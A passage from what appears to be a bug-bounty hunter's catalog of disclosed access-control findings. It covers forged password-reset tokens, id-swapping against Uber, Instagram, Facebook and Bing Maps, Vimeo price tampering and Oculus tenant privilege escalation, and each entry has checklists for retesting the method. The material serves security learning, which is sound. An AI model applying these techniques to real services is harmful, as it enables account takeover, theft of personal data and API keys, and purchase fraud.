- Q: "Have I cataloged the reusable vulnerable params on this app and retested them everywhere? Is there an endpoint where supplying a user id logs me in as them?"

### [457] California startup — forge the reset token (userID is a red herring): reset URL = `userID` + `key`(16-char) + `auth`(16-char base64); userID is generated-but-unused; `auth` base64-decodes to the requester's email; `key` follows a fixed 16-char format across requests → craft a same-format `key` + set `auth`=base64(victim email) → reset succeeds → ATO, then change email to lock the victim out — Prateek Tiwari [NEW ★ analyze multiple reset tokens to learn the format and FORGE one; spot the decoy param]
- Where: reset URL params `userID` (decoy), `key` (forgeable 16-char), `auth` (base64 email).
- Approach/how-found: swapping userID did nothing (generated, unused). Requesting several resets showed `auth` was base64(email) and `key` always followed the same 16-char format; he set `auth` to base64(victim email) and forged a same-format `key` → reset the victim's password (then changed their email for full lockout).
- Test: request MANY reset links and diff the tokens — identify which encodes the email (base64) and which is forgeable by pattern; ignore decoy params (a userID that does nothing); if a token's format is predictable, craft your own.
- Q: "Across several reset links, which token encodes the email and which is a guessable/fixed-format value? Is a param (userID) a decoy? Can I forge the token's format and set the email to the victim?"

### [458] Facebook/Parse — download ANY app's analytics report by swapping the `appname` in the CSV export URL: `GET /apps/<appname>--2/analytics_batch?from=&to=` — S. Venkatesh [DUP-reinforce: export/report endpoint keyed on a name string, swappable]
- Where: Parse (BaaS, FB acquisition) dashboard "export reports to CSV"; `GET https://www.parse.com/apps/<appname>--2/analytics_batch?from=&to=`.
- Approach/how-found: created two apps under two accounts; the CSV-download request embedded his own app's name; changing `appname` to the other user's app downloaded that app's analytics report — any app's report was downloadable by name.
- Test: export/download/report endpoints often key on an app/project NAME (string) rather than an authorized id; swap it to another tenant's name. Names are easy to enumerate/guess vs random ids.
- Q: "Does the export/report/download URL embed an app/project NAME I can swap to fetch another tenant's data? Are those names enumerable?"

### [459] Uber ($18k) — session-in-GET-params + UUID-as-token: trip-history request puts the entire session in GET params (`uuid`+`token`, no cookies); 403 unless you set BOTH `uuid` AND `token` to the VICTIM's UUID (the token field accepts the UUID) → all their trips with maps/cost/driver; Help-form leaks email by swapping `token`→victim UUID; waybill by driver UUID (sourced via request-car→accept→cancel); `allowNotActivated`/`isActivated`=true to use the unactivated app; promo brute (no rate limit) — Integrity team [NEW ★★ flagship: auth carried as guessable GET params; the same UUID doubles as the token; harvest UUIDs from many flows]
- Where: trip-history GET (`uuid`+`token` in URL); Help form (`token`); waybill (driver UUID); login (`allowNotActivated`/`isActivated`); promo endpoint.
- Approach/how-found: the trips endpoint authenticated via GET params only; swapping just `uuid` gave 403, but setting `token` to the victim's UUID too (the server treats a UUID as a valid token) returned their full trip history. UUIDs were harvested from the fare-split response (driver+invitee UUIDs+pics), the email-leak Help form, and ordering/cancelling a ride (driver UUID) → waybill (last trip). Login flags `allowNotActivated`/`isActivated` could be flipped to true to access the partner app unactivated.
- Test: when auth is carried in GET params (no cookies), try setting the secret/token field to the same value as the user UUID/id — apps sometimes accept the id as its own token; harvest UUIDs from every response (fare-split, help-form, ride accept/cancel); flip boolean state flags (`isActivated`/`allowNotActivated`) in auth responses/requests.
- Q: "Is the session in guessable GET params? Does the token field accept the user's UUID/id? Where do other users' UUIDs leak (split/help/ride flows)? Can I flip an activation/state flag to unlock features?"

### [460] Instagram — compromise 4% of (temporarily locked) accounts: the `checkpoint_logged_out_main` verify page is reachable UNAUTHENTICATED and keyed on the incremental user id; "update email/phone & verify" lets you set victim contact → password reset → ATO — Arne Swinnen ($5,000) [NEW ★ unauthenticated checkpoint page + incremental id + set-contact → reset → ATO; ~3.88% in the takeoverable phone state]
- Where: post-login "verify your account" flow `.../challenge/.../checkpoint_logged_out_main` containing the account's unique (incremental) user id; states include "update email & verify" and "update phone number & verify".
- Approach/how-found: logging into an inactive test account, he was sent to a verification page whose URL was reachable without auth and embedded the user id. Instagram ids are incremental, so he enumerated a 1,000,000-id range (2.000000000–2.001000000) and bucketed the states: captcha-only / email-or-SMS verify (no impact) vs **"update email & verify" (0.17%)** and **"update phone & verify" (3.88%)** — the latter let an attacker set a NEW email/phone on the locked account, then run reset-password-via-email/SMS → full takeover. ~4% of ~500M accounts were in a vulnerable locked state.
- Exploit: for accounts in the update-contact state, set attacker-controlled email/phone, then password-reset to that contact → ATO (he deliberately did NOT take over real accounts — responsible disclosure).
- Test: unauthenticated checkpoint/verification/challenge pages keyed on an enumerable user id are high-impact — they may expose update-email/phone actions that seed an ATO via reset. Bucket large id ranges by account STATE to find the exploitable subset; incremental ids make population-scale measurement trivial.
- Q: "Is the account-verification/checkpoint page reachable without auth and keyed on an enumerable id? Does any state let me set the victim's email/phone (→ password reset → ATO)? What fraction of an id range is in that exploitable state?"

### [461] Bing Maps Portal — API keys of every user via `Account ID` swap: the usage-details GET carries your Account ID; change 1418765→1418766 → another user's API keys, app names, and usage (including ENTERPRISE keys) — Sai Krishna Kothapalli [DUP-reinforce: developer-portal stats keyed on a sequential account id → credential disclosure]
- Where: Bing Maps usage-details GET, `Account ID` (sequential).
- Approach/how-found: the key-usage page sent his Account ID in the URL; incrementing it returned other accounts' API keys and stats.
- Test: developer/API-portal "usage/keys/stats" pages keyed on a sequential account id leak the actual API keys — enumerate; API keys are high-value (often enterprise).
- Q: "Does the developer portal return API keys/secrets by a sequential account id? Can I enumerate to harvest other tenants' keys?"

### [462] Facebook m.facebook.com — friend list & "most tagged with" regardless of privacy via username-in-URL: the mobile year-overview pages (`/<username>/.../2014`, `/<username>/stories/2015/most_tagged_with/`) honor a swapped username → private relationship data — Josip Franjković [DUP-reinforce: username-in-path on secondary (mobile) pages bypasses privacy]
- Where: `m.facebook.com/<username>/...` year-overview / most_tagged_with pages.
- Approach/how-found: the mobile "factoid" pages took a username in the path and returned friends-made / most-tagged-with ignoring both accounts' privacy settings.
- Test: secondary/mobile surfaces (m.* , year-in-review, stories, factoids) often skip privacy checks — swap the username/id in the path; enumerate the different factoid endpoints.
- Q: "Do mobile/secondary pages enforce privacy, or return data by a swapped username? Which 'factoid'/overview endpoints leak relationships?"

### [463] Zomato (62.5M users) — sequential `browser_id` → PII + Instagram access token: the API reflected user data keyed on `browser_id` (sequential); increment → other users' phone/address/DOB AND their Instagram access_token (→ view their private Instagram photos); user ids are public in profile URLs — Anand Prakash [NEW ★ sequential id leaks a CHAINABLE secret (3rd-party OAuth token) → pivot to another platform]
- Where: Zomato API request keyed on sequential `browser_id`/user id (id is public in the profile URL).
- Approach/how-found: the data API reflected the account by `browser_id`; sequential enumeration returned other users' PII and, crucially, their linked Instagram access_token → use it to read their private Instagram photos.
- Test: enumerate sequential user ids for PII, but also scan the leaked fields for CHAINABLE secrets (OAuth/access tokens, API keys) that pivot to other platforms; harvest the base id from public profile URLs.
- Q: "Does the leaked record include a 3rd-party access token/OAuth secret I can reuse elsewhere (Instagram/Google)? Is the id sequential and sourced from public profiles?"

### [464] Vimeo — buy any On-Demand video / Pro membership for $0.1 by tampering the `price` field in the purchase POST: `vin_Transaction_transactionItems_0_price=0.1` — N.B. Sriharsha [NEW: client-controlled price/amount in checkout (value-tampering sibling of IDOR); 0/neg rejected, 0.1 accepted]
- Where: `POST /store/ondemand/buy/<id>` with `vin_Transaction_transactionItems_0_price=<value>` (also Pro membership).
- Approach/how-found: intercepted the buy request and saw the price was sent client-side; changing it to `0.1` then paying via PayPal completed the purchase cheaply. Setting `0`/`0.001` broke the PayPal redirect, so `0.1` was the working minimum.
- Test: in checkout/purchase/upgrade requests, look for client-supplied `price`/`amount`/`currency`/`quantity` (or negative quantities) — servers often trust them. Probe edge values; if `0` fails, a tiny positive value may still slip through.
- Q: "Is the price/amount/quantity sent from the client and trusted server-side? Can I lower it (or go negative) to buy/upgrade for almost nothing?"

### [465] Oculus dev portal ($30k) — cross-company user-management IDOR → admin: a company admin can manage users in their company, but the management script didn't verify the target username BELONGS to your company → move the ADMIN user into your company, reset their password, log in; chained with header BSQLi + eval() CSRF-RCE — bitquark [NEW ★ move a FOREIGN user/object into YOUR tenant to gain control over it (privesc)]
- Where: company "manage users" script (target username not bound to your company).
- Approach/how-found: the manage-user action accepted any username, even from other companies → he moved the global admin account into his own company, then reset its password and took over the admin panel. (Also found X-Forwarded-For SQLi and an unauthenticated eval() preview = CSRF→RCE.)
- Test: multi-tenant "manage members" features — try acting on users/objects from OTHER tenants; if you can MOVE/REASSIGN a foreign (privileged) user into your tenant, you can then reset/control it. Also test header-based SQLi (X-Forwarded-For) and admin eval/preview tools for CSRF→RCE.
- Q: "Can I manage/move a user or object from another company into mine? Can I pull a privileged account into my tenant and reset it? Are admin debug tools (eval/preview) CSRF-protected?"

### [466] Facebook ($12,500) — delete any photo via Support Dashboard claim: the photo-removal-claim URL has `cid`=photo_id and `rid`=profile_id; set cid to a victim's photo and rid to YOUR profile → Facebook emails/DMs YOU the photo-removal link → click it → the photo is deleted with no notification to the owner — Arul Kumar [NEW ★ a "claim/report" flow generates a privileged action link keyed on ids you control → delete others' content]
- Where: Support Dashboard photo-removal request, `cid` (photo_id) + `rid` (profile_id), on the mobile domain.
- Approach/how-found: when a reported photo wasn't removed, the dashboard let users send a removal request to the photo owner; the server generated a removal link by `cid`+`rid`. Setting cid=victim's photo and rid=attacker's profile delivered the removal link to the attacker → clicking it deleted the victim's photo silently.
- Test: report/claim/appeal flows that GENERATE an action link (removal/approval/reset) keyed on object+recipient ids — set the object to a victim's and the recipient to yourself to receive and trigger the privileged action; check the MOBILE domain separately.
- Q: "Does a report/claim flow generate a privileged action link keyed on ids I control? Can I set the object to a victim's and the recipient to me? Is the mobile domain weaker?"

### [467] Facebook — deanonymize friends of locked profiles via likes-visibility IDOR: the "who liked this object" URL wasn't access-checked → list everyone who liked a private/locked user's profile picture (= their friends), bypassing friends-list privacy; also found Instagram's Ganglia via Shodan (origin IP behind HTTP auth) — Josip Franjković [NEW: a public-ish "who liked" list bypasses a stricter privacy control (friends list); re-report edge cases with a stronger PoC]
- Where: "who liked [object]" endpoint (not access-checked); `ganglia.instagram.com` origin IP via Shodan.
- Approach/how-found: likes inherit object visibility, but the who-liked endpoint didn't verify the requester → on a locked profile whose friends list is hidden, listing who liked their profile picture reveals friends. He also bypassed Ganglia's HTTP auth by finding the raw origin IP on Shodan. Facebook first dismissed it; a sharper PoC (deanonymizing a fully-locked profile's friends) got it accepted.
- Test: a weaker "who liked/viewed/reacted/attending" list can leak data a stricter control (friends list/privacy) protects — use it as a side channel; find origin IPs (Shodan/crt.sh) to bypass edge auth; re-report dismissed "edge cases" with a stronger impact PoC.
- Q: "Is there a 'who liked/reacted/viewed' list that leaks relationships the privacy settings hide? Can I reach the origin IP behind auth via Shodan? Can a better PoC reframe a dismissed bug as impactful?"

